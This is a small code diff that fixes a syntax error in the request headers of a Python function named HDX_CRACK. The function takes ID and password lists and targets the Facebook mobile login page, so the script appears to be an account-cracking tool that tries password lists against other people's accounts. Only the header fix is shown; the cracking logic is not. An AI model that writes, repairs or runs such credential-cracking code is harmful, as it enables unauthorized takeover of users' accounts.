@@ -461,7 +461,7 @@ def HDX_CRACK(ids,passlist,tl):
             "login":"Log In"}
             header_freefb = {
             'authority': 'm.alpha.facebook.com',
-            'method',: 'GET',
+            'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
